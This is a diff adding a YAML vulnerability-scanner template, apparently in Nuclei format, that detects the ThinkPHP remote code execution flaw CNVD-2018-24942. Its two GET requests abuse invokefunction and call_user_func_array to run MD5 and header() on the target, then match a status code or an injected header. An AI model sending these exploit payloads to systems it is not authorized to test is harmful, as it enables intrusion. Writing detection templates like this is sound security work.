@@ -1,0 +1,31 @@
+id: yaml-poc-thinkphp-thinkphp-rce-CNVD-2018-24942
+info:
+  name: Yaml Poc Thinkphp Thinkphp Rce Cnvd 2018 24942
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-thinkphp-thinkphp-rce-CNVD-2018-24942'
+  tags: thinkphp,rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=MD5&vars[1][]={{c1}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]=TPRCEHEADER:{{c1}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: header
+    words:
+    - TPRCEHEADER
